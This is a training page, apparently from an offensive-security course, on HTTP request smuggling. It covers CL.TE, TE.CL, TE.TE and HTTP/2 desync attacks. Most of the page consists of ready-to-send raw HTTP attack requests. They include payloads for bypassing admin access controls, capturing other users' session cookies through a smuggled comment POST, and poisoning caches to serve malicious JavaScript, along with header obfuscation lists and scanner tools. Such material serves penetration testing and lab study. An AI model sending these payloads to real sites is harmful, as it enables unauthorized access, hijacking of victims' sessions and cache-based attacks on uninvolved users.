---
layout: training-page
title: "HTTP Request Smuggling — Red Team Academy"
module: "Web Hacking"
tags:
  - http-smuggling
  - cl-te
  - te-cl
  - h2-desync
  - cache-poisoning
page_key: "web-http-smuggling"
render_with_liquid: false
---

# HTTP Request Smuggling

HTTP request smuggling exploits discrepancies in how front-end proxies and back-end servers parse HTTP/1.1 request boundaries. By crafting an ambiguous request, you can "smuggle" a partial request prefix onto the TCP connection, which the back-end prepends to the next legitimate user's request — enabling access control bypass, session hijacking, and cache poisoning.

## How It Works

```
# HTTP/1.1 request length determined by two headers:
# Content-Length (CL): body is exactly N bytes
# Transfer-Encoding: chunked (TE): body ends at "0\r\n\r\n" chunk

# When front-end and back-end disagree on which header to use:
# → front-end uses CL, back-end uses TE: CL.TE vulnerability
# → front-end uses TE, back-end uses CL: TE.CL vulnerability
# → both support TE but handle different obfuscations: TE.TE vulnerability

# Detection indicator: time delays, unexpected 400/500 responses,
# or reflected prefix in next response
```

## CL.TE — Front-end Uses Content-Length

Front-end reads Content-Length, back-end reads Transfer-Encoding. The leftover bytes become the start of the next request.

```
# Detection — time-based (causes back-end to wait for more chunked data):
POST / HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

1
Z
Q  ← back-end waits for "0" terminator → 10-second delay = CL.TE vulnerable

# Exploit — poison the socket:
POST / HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Transfer-Encoding: chunked

e
q=smuggled_body
0

GET /admin HTTP/1.1
Host: target
Foo: x   ← next legitimate request gets this prefix prepended
```

## TE.CL — Front-end Uses Transfer-Encoding

Front-end reads Transfer-Encoding: chunked and passes everything; back-end uses Content-Length and leaves remainder in buffer.

```
# Detection — time-based (back-end waits for CL bytes):
POST / HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0

# Exploit — prepend to next request:
POST / HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

5d
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

# Note: exact byte counts critical — use Burp "HTTP Request Smuggler" extension
```

## TE.TE — Obfuscated Transfer-Encoding

Both servers support TE but one can be confused by an obfuscated header value.

```
# Obfuscation techniques for Transfer-Encoding:
Transfer-Encoding: xchunked
Transfer-Encoding: chunked
Transfer-Encoding: chunked
Transfer-Encoding: CHUNKED
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X: X[newline]Transfer-Encoding: chunked
Transfer-Encoding
: chunked

# Try each until one server accepts and one rejects → TE.TE desync
```

## HTTP/2 Smuggling (h2.cl / h2.te)

HTTP/2 doesn't use CL/TE for framing — but when h2 is downgraded to h1 at a reverse proxy, injecting these headers into the h2 request can desync the backend.

```
# h2.CL — inject Content-Length in h2 request:
# Burp Suite "HTTP/2" tab → add Content-Length header manually
# with value smaller than actual body → back-end sees leftover bytes

# h2.TE — inject Transfer-Encoding: chunked header in h2 request:
# Many proxies strip TE in h2, but some pass it through
# If back-end sees chunked TE: treats remainder as new request

# h2 request splitting via header name containing \r\n:
# Header name: "Foo: bar\r\n\r\nGET /admin HTTP/1.1\r\nHost: target"
# Some h2 implementations pass the \r\n into h1 translation

# Tools: Burp Suite Pro + HTTP Request Smuggler extension
# Use "HTTP/2" request view in Burp to craft h2 attacks
```

## Exploitation — Access Control Bypass

```
# Goal: access /admin which is blocked for your IP
# Smuggle a request to /admin prefixed to next user's request:

POST / HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded
Content-Length: 116
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1
# When next user sends request, back-end prepends GET /admin to it
# Your "GET /admin" appears to come from internal → allowed
```

## Exploitation — Capturing Credentials

```
# Smuggle a request that ends with a partial POST body
# Next user's request (including their headers/cookies) fills the body
# Stored in a comment/search field → exfiltrated

POST / HTTP/1.1
Host: target
Content-Length: 198
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: target
Cookie: session=YOUR_SESSION
Content-Type: application/x-www-form-urlencoded
Content-Length: 800  ← large enough to capture next user's headers

csrf=token&postId=5&name=test&email=test@test.com&website=&comment=x
# Next user's request fills the 800-byte "comment" body
# Their session cookie is stored in the comment → retrieve from post
```

## Cache Poisoning via Smuggling

```
# Smuggle a request that gets cached with attacker-controlled response:
# Front-end caches response for /static/js/app.js
# Smuggle a request to /static/js/app.js with malicious response

# Typical flow:
# 1. Poison: smuggled request returns attacker-controlled content
# 2. Victim requests /static/js/app.js → gets poisoned cached response
# 3. XSS or token theft from cached JS
```

## HTTP Smuggling Payloads

Complete payload examples from PayloadsAllTheThings for each smuggling variant.

### CL.TE Minimal Detection Payload

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

### CL.TE Real Example (Burp Repeater)

```
POST / HTTP/1.1
Host: domain.example.com
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

G
# Note: back-end sees leftover "G" which becomes prefix of next request
# Next request arrives at back-end pre-prefixed with "G"
```

### TE.CL Real Example

```
POST / HTTP/1.1
Host: domain.example.com
Content-Length: 4
Connection: close
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
x=1
0

# IMPORTANT: uncheck "Update Content-Length" in Burp Repeater
# Include trailing \r\n\r\n after the final 0
```

### HTTP/2 Request Splitting via Header Name

```
# Inject \r\n inside an HTTP/2 header name to split into HTTP/1.1:
:method  GET
:path    /
:authority  www.example.com
Foo: bar\r\n\r\nGET /admin HTTP/1.1\r\nHost: www.example.com

# Some h2→h1 translation layers pass the injected newlines through
# → back-end sees two separate requests
```

### Client-Side Desync

```
# When the server is HTTP/1.1 and the front-end is a CDN:
# Some servers respond to HEAD with a body — client-side desync
# 1. Send crafted request that causes server to generate a partial response
# 2. Browser's fetch() reuses the poisoned connection
# 3. Victim's next request is prefixed with attacker data

# Detection: look for endpoints that:
# - Accept GET/HEAD with a body
# - Echo user input into response headers or body
```

## CL.TE vs TE.CL Techniques

Decision tree and key differences for selecting the correct technique.

```
# Determine which type you have:
# Test CL.TE (front-end uses CL):
# → Send short CL with chunked body terminating after 1 chunk
# → If back-end hangs waiting for more chunked data: CL.TE
POST / HTTP/1.1
Content-Length: 4
Transfer-Encoding: chunked
[body: "1\r\nZ\r\nQ"]   # CL=4 includes "1\r\nZ\r\n", Q is leftover
# If 10s delay: CL.TE confirmed

# Test TE.CL (front-end uses TE):
# → Send chunked body with small CL value
POST / HTTP/1.1
Content-Length: 3
Transfer-Encoding: chunked
[body: "8\r\nSMUGGLED\r\n0\r\n\r\n"]
# Front-end accepts full chunked body, back-end uses CL=3, leaves remainder
# If delay or error: TE.CL confirmed

# TE.TE — both use TE, confuse one with obfuscated header:
Transfer-Encoding: xchunked    # try each until one is ignored
Transfer-Encoding : chunked
Transfer-Encoding: CHUNKED
Transfer-Encoding:[tab]chunked

# Tools to automate detection:
# Burp Suite Pro → HTTP Request Smuggler extension (albinowax)
# github.com/defparam/smuggler — Python CLI scanner
# github.com/dhmosfunk/simple-http-smuggler-generator — payload generator
```

## Tools

- Burp Suite Pro — HTTP Request Smuggler extension (albinowax)
- `smuggler.py` — `github.com/defparam/smuggler`
- PortSwigger HTTP Smuggling labs — `portswigger.net/web-security/request-smuggling` (16 labs)
- HTTP/2 desync attacks — `portswigger.net/research/http2`
